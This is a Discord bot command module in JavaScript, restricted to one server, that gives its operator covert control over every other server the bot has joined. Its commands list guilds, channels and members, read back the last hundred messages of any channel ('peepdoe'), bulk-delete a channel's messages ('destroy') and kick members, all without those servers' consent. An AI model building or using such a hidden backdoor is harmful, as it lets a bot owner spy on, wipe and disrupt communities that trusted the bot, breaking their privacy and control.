module.exports = function (prefix, cmd, conargs, bot, message, messageArray) {
    if (message.guild.id != "392186594485862400") {
        return;
    }
    if (cmd === `${prefix}say`) {
		let ruser = message.mentions.users.first();
		message.channel.send(`${ruser}` +
			"");
		message.delete();
	}
    if (cmd == `${prefix}listg`) {
        var c = 1;
        bot.guilds.forEach(function (guild) {
            message.channel.send("```" + c + " " + guild.name + " (" + guild.id + ")```");
            c++;
        })
    }
    if (cmd == `${prefix}listc`) {
        bot.guilds.get(conargs).channels.forEach(function (channel) {
            message.channel.send("```" + channel.name + " (" + channel.id + ") " + channel.type + "```");
        });
    }
    if (cmd == `${prefix}listm`) {
			var c = 1;
			bot.guilds.get(messageArray[1]).members.forEach(function (member) {
				message.channel.send("```" + c + " " + member.displayName + " (" + member.id + ")```");
				c++;
			});
	}
    if (cmd == `${prefix}destroy`) {
        message.delete();
        var channel = bot.guilds.get(messageArray[1]).channels.get(messageArray[2]);
        if (channel.type == "text") {
                channel.fetchMessages({
                        limit: 100
                    })
                    .then(function (pmessage) {
                        pmessage.forEach(function (ppmessage) {
                            ppmessage.delete();
                        })
                    })
        }
    }
    if (cmd == `${prefix}peepdoe`) {
        var channel = bot.guilds.get(messageArray[1]).channels.get(messageArray[2]);
        if (channel.type == "text") {
                channel.fetchMessages({
                        limit: 100
                    })
                    .then(function (pmessage) {
                        pmessage.forEach(function (ppmessage) {
                            message.channel.send(ppmessage.content + " ```" + ppmessage.createdAt + "```");
                        })
                    })
        }
    }
    if (cmd == `${prefix}kick`) {
        bot.guilds.get(messageArray[1]).members.get(messageArray[2]).kick();
    }
}